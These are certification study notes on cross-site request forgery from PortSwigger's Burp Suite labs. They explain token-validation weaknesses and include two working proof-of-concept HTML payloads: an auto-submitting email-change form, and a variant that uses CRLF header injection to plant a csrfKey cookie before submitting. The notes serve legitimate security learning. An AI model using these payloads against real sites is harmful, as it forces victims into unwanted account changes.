##### PortSwigger BurpSuite Certification Summary
# Cross-site Request Forgery (CSRF)
CSRF is the act of making the victim perform an action against their will/knowledge. This can be something like changing the email address of a website and three conditions need to be met:
  * There has to be a functionality the attacker wants to abuse
  * Session handling is purely cookie based
  * All request parameters are known or determinable

In BurpSuite, a HTML form can be crafted from the request relating to the desired action (`Right Click Request -> Engagement Tools -> Generate CSRF PoC`):
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac311f611e01c9fcc0242d4b001e00b5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
which creates something like this. The auto-submit function has to be enabled while generating the HTML. 

CSRF is mostly prevented by using CSRF tokens, which will be sent with each request and relate to the user's session. This token is not predictable by an attacker and makes the attack impossible. However, this is only the case if everything is done correctly. 

One example is the **check for the CSRF token depending on the request method**. It is possible that multiple methods are accepted for the same action. Changing the method is easily doable in Burp `Send Request to Repeater -> Change Request Method -> ...`

**Omitting the token alltogether** might work too. It is also possible that **every token from any user** work (the website just checks if it's been assigned, but not to whom).

In the latter case, the exploit can have quite a few steps. Let there be two variables, the `csrf` parameter and a `csrfKey` cookie. They both are linked together, but not to the session at all. This allows an attacker to provide both values and being able to run an action independent of the session cookie set. It is therefore detrimental to set the `csrfKey` for the victim before performing an action in it's name. This can be done with a request that does not enforce the CSRF protection, such as the search function (the injection can happen anywhere on the same domain). So when everything comes together, the attacker delivers a web page to the victim with the following elements:
  * A request for the desired action that is automatically triggered
  * The `csrf` parameter in the request
  * The corresponding `csrfKey` in a separate request which sets it for the victim

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="VICTIM-HOST/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;asdf&#46;com" />
      <input type="hidden" name="csrf" value="Qlu7jqbG0dKWhtvQYQGvLf1l1Na5ME68" />
      <input type="submit" value="Submit request" />
    </form>
    <img src= "VICTIM-HOST/?search=jo%0d%0aSet-Cookie:+csrfKey=9ic4w4aZZtPqElWQZHuMzo6D78Br9PnQ" onerror="document.forms[0].submit()">
  </body>
</html>

```
This code provides all information that is usually sent with the change email request and then loads an image with the injection point for the `csrfKey` as source. This sets the cookie value for the user (note the `\r\n` and `Set-Cookie: ` ), but fails to load the image, which in return triggers the form being submitted.